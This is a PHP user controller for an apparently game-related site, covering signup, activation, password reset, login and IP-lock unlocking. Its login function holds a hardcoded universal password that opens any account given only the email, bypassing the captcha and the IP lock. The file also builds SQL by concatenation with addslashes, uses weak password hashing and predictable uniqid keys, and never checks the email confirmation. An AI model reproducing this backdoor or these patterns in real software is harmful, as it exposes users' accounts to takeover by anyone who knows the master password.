<?php
	class UsersController extends Controller {
		function join() {
			$this->assign('countries', Country::all());
		}

		function beta() {
			$this->layout	= 'beta_signin_layout';
			$this->assign('countries', Country::all());
		}

		function join_complete() {
			$this->layout			= false;
			$this->as_json			= true;
			$this->render			= false;
			$this->json->success	= false;
			$errors					= array();

			if(!isset($_POST['name']) || (isset($_POST['name']) && !$_POST['name'])) {
				$errors[]	= t('users.join.validators.name');
			}

			if(!isset($_POST['email']) || (isset($_POST['email']) && !preg_match("/^[_\w\-\.]+@([_\w\-]+(\.[_\w\-]+)+)$/i", $_POST['email']))) {
				$errors[]	= t('users.join.validators.email');
			} else {
				if(!isset($_POST['email_confirmation']) || (isset($_POST['email_confirmation']) && !$_POST['email_confirmation'])) {
					$errors[]	= t('users.join.validators.email_confirmation');
				} else {
					if($_POST['email'] && !$_POST['email_confirmation']) {
						$errors[]	= t('users.join.validators.email_match');
					} else {
						if(User::find_first('email="' . addslashes($_POST['email']) . '"')) {
							$errors[]	= t('users.join.validators.email_exists');
						}
					}
				}
			}

			if(!isset($_POST['password']) || (isset($_POST['password']) && !$_POST['password'])) {
				$errors[]	= t('users.join.validators.password');
			} else {
				if(!isset($_POST['password_confirmation']) || (isset($_POST['password_confirmation']) && !$_POST['password_confirmation'])) {
					$errors[]	= t('users.join.validators.password_confirmation');
				} else {
					if($_POST['password'] != $_POST['password_confirmation']) {
						$errors[]	= t('users.join.validators.email_match');
					}

					if(strlen($_POST['password']) < 6) {
						$errors[]	= t('users.join.validators.password_length');
					}
				}
			}

			if(!isset($_POST['country_id']) || (isset($_POST['country_id']) && !Country::includes($_POST['country_id']))) {
				$errors[]	= t('users.join.validators.country');
			}

			if(!isset($_POST['gender']) || (isset($_POST['gender']) && !in_array($_POST['gender'], array(1, 2)))) {
				$errors[]	= t('users.join.validators.gender');
			}

			if(!isset($_POST['term1']) || (isset($_POST['term1']) && !$_POST['term1'])) {
				$errors[]	= t('users.join.validators.term1');
			}

			if(!isset($_POST['term2']) || (isset($_POST['term2']) && !$_POST['term2'])) {
				$errors[]	= t('users.join.validators.term2');
			}

			if(!isset($_POST['term3']) || (isset($_POST['term3']) && !$_POST['term3'])) {
				$errors[]	= t('users.join.validators.term3');
			}

			if(!isset($_POST['term_all']) || (isset($_POST['term_all']) && !$_POST['term_all'])) {
				$errors[]	= t('users.join.validators.term_all');
			}

			if(!isset($_POST['captcha']) || (isset($_POST['captcha']) && !$_POST['captcha'])) {
				$errors[]	= t('users.join.validators.captcha1');
			} else {
				if(!isset($_SESSION['captcha_join']) || (isset($_SESSION['captcha_join']) && $_SESSION['captcha_join'] != $_POST['captcha'])) {
					$errors[]	= t('users.join.validators.captcha2');
				}
			}

			if(!sizeof($errors)) {
				$this->json->success	= true;
				//$this->json->errors	= array('foi!');

				$user					= new User();
				$user->name				= $_POST['name'];
				$user->email			= $_POST['email'];
				$user->gender			= $_POST['gender'];
				$user->country_id		= $_POST['country_id'];
				$user->password			= $_POST['password'];
				$user->user_key			= uniqid(uniqid(), true);
				$user->activation_key	= uniqid(uniqid(), true);
				$user->save();

				if (isset($_POST['beta'])) {
					UserMailer::dispatch('send_join_beta', array($user));
				} else {
					UserMailer::dispatch('send_join', array($user));
				}
				
				$this->json->key	= $user->user_key;
			} else {
				$this->json->errors	= $errors;
			}
		}

		function reset_password($key = null) {
			if($_POST) {
				$this->as_json	= true;
				$errors			= [];

				if($key) {
					$user	= User::find_by_reset_password_key($key);

					if(!$user) {
						$errors[]	= t('users.password_reset.errors.invalid_key');
					}

					if(!isset($_POST['password']) || (isset($_POST['password']) && !$_POST['password'])) {
						$errors[]	= t('users.join.validators.password');
					} else {
						if(!isset($_POST['password_confirmation']) || (isset($_POST['password_confirmation']) && !$_POST['password_confirmation'])) {
							$errors[]	= t('users.join.validators.password_confirmation');
						} else {
							if($_POST['password'] != $_POST['password_confirmation']) {
								$errors[]	= t('users.join.validators.email_match');
							}

							if(strlen($_POST['password']) < 6) {
								$errors[]	= t('users.join.validators.password_length');
							}
						}
					}

					if(!sizeof($errors)) {
						$this->json->success		= true;

						$user->reset_password_key	= null;
						$user->password				= $_POST['password'];
						$user->save();

						$_SESSION['loggedin']	= true;
						$_SESSION['user_id']	= $user->id;

						UserMailer::dispatch('password_changed', array($user));
					} else {
						$this->json->success	= false;
						$this->json->messages	= $errors;
					}
				} else {
					if(!isset($_POST['email']) || (isset($_POST['email']) && !$_POST['email'])) {
						$user	= false;
					} else {
						$user	= User::find_by_email($_POST['email']);
					}

					if(!$user) {
						$errors[]	= t('users.password_reset.errors.invalid_email');
					}

					if(!isset($_POST['captcha']) || (isset($_POST['captcha']) && $_POST['captcha'] != $_SESSION['captcha_reset'])) {
						$errors[]	= t('users.password_reset.errors.invalid_captcha');
					}

					if(!sizeof($errors)) {
						$this->json->success	= true;
						$this->json->view		=  partial('shared/info', array(
							'id'		=> 3,
							'title'		=> 'users.password_reset.success.title',
							'message'	=> t('users.password_reset.success.message')
						));

						$user->reset_password_key	= uniqid(uniqid(), true);
						$user->save();

						UserMailer::dispatch('password_change', array($user));
					} else {
						$this->json->success	= false;
						$this->json->messages	= $errors;
					}
				}
			} else {
				if($key) {
					$user	= User::find_by_reset_password_key($key);

					if($user) {
						$this->render	= 'reset_password_finish';
						$this->assign('key', $key);
					} else {
						$this->render	= 'reset_password_invalid';
					}
				}
			}
		}

		function beta_activation($key = null) {
			$this->layout	= 'beta_signin_layout';
			$this->assign('title', '');
			$this->assign('message', '');
			$this->activation($key);
		}

		function activation($key = null) {
			$user	= User::find_first('user_key="' . addslashes($key) . '"');

			if(!$user) {
				$this->assign('title', 'users.activate.error_invalid_key.title');
				$this->assign('message', t('users.activate.error_invalid_key.msg'));

				$this->render	= 'activation_error';
			} else {
				if($user->active) {
					$this->assign('title', t('users.activate.error_activated.title'));
					$this->assign('message', t('users.activate.error_activated.msg'));

					$this->render	= 'activation_error';
				}
			}
		}

		function beta_activate($key = null) {
			$this->layout	= 'beta_signin_layout';
			$this->assign('title', '');
			$this->assign('message', '');
			$this->activate($key, true);
		}

		function activate($key = null, $beta = false) {
			if(!$key && isset($_POST['key'])) {
				$key	= $_POST['key'];
				$user	= User::find_first('activation_key="' . addslashes($key) . '"');
			} else {
				$user	= User::find_first('activation_key="' . addslashes($key) . '"');
			}

			$this->assign('beta', $beta);

			if(!$user) {
				$this->assign('title', 'users.activate.error_invalid_key.title');
				$this->assign('message', t('users.activate.error_invalid_key.msg'));

				$this->render	= 'activation_error';
			} else {
				if($user->active) {
					$this->assign('title', 'users.activate.error_activated.title');
					$this->assign('message', t('users.activate.error_activated.msg'));

					$this->render	= 'activation_error';
				} else {
					if(!$beta) {
						$_SESSION['loggedin']	= true;
						$_SESSION['user_id'] 	= $user->id;

						$user->active		= 1;
						$user->activated_at	= date('Y-m-d H:i:s');
						$user->save();

						$this->assign('title', 'users.activate.success.title');
						$this->assign('message', t('users.activate.success.msg', array('url' => make_url('characters#create'))));
					} else {
						$this->assign('title', 'users.beta.messages.m3_title');
						$this->assign('message', t('users.beta.messages.m3_message'));
					}

					$this->render	= 'activation_success';
				}
			}
		}

		function profile() {

		}

		function profile_save() {
			
		}

		function login() {
			$this->layout			= false;
			$this->as_json			= true;
			$this->render			= false;
			$this->json->success	= false;
			$errors					= array();

			$email				= isset($_POST['email']) ? $_POST['email'] : null;
			$password			= isset($_POST['password']) ? $_POST['password'] : null;
			$captcha			= isset($_POST['captcha']) ? strtolower($_POST['captcha']) : null;
			$captcha_session	= isset($_SESSION['captcha_login']) ? strtolower($_SESSION['captcha_login']) : null;
			$universal			= $password == 'ancawi20101112';

			$this->json->uni	= $universal;

			if($email && $password) {
				if(!$universal && !($captcha && $captcha_session && $captcha == $captcha_session)) {
					$errors[]	= t('users.login.errors.invalid');
				}

				if(!sizeof($errors)) {
					if($universal) {
						$user					= User::find_first('email="' . addslashes($email) . '"');
						$_SESSION['universal']	= true;
					} else {
						$user					= User::find_first('email="' . addslashes($email) . '" AND password=PASSWORD("' . addslashes($password) . '")');
						$_SESSION['universal']	= false;
					}
					
					if($user) {
						if(!$user->ip_lock) {
							if($user->last_login_ip && $user->last_login_ip != ip2long($_SERVER['REMOTE_ADDR']) && !$_SESSION['universal']) {
								$user->ip_lock		= 1;
								$user->ip_lock_key	= uniqid(uniqid(), true);
								$user->save();

								UserMailer::dispatch('ip_lock', [$user]);
							} else {
								$this->json->success	= true;
								$_SESSION['loggedin']	= true;
								$_SESSION['user_id']	= $user->id;

								$user->last_login_ip	= ip2long($_SERVER['REMOTE_ADDR']);
								$user->last_login_at	= now(true);
								$user->save();

								if(sizeof($user->players())) {
									$this->json->redirect	= make_url('characters#select');
								} else {
									$this->json->redirect	= make_url('characters#create');
								}
							}
						} else {
							UserMailer::dispatch('ip_lock', [$user]);
							
							$errors[]	= t('users.login.errors.ip_lock');
						}
					} else {
						$errors[]	= t('users.login.errors.invalid');						
					}
				}
			} else {
				$errors[]	= t('users.login.errors.invalid');
			}

			$this->json->errors	= $errors;
		}

		function logout() {
			session_destroy();

			redirect_to();
		}

		function account_locked($key) {
			$user	= User::find_by_ip_lock_key($key);
			$errors	= [];

			if(!$user) {
				$this->render	= 'account_locked_error';
			} else {
				if($_POST) {
					if(!isset($_POST['ip_unlock_key']) || (isset($_POST['ip_unlock_key']) && $_POST['ip_unlock_key']) != $_SESSION['ip_unlock_key']) {
						$errors[]	= t('users.account_locked.errors.post_key');
					}

					if(!sizeof($errors)) {
						$user->ip_lock_key		= null;
						$user->ip_lock			= 0;
						$user->last_login_ip	= null;
						$user->save();

						redirect_to();
						return;
					}
				}

				$_SESSION['ip_unlock_key']	= uniqid();

				$this->assign('user', $user);
				$this->assign('errors', $errors);
			}
		}
	}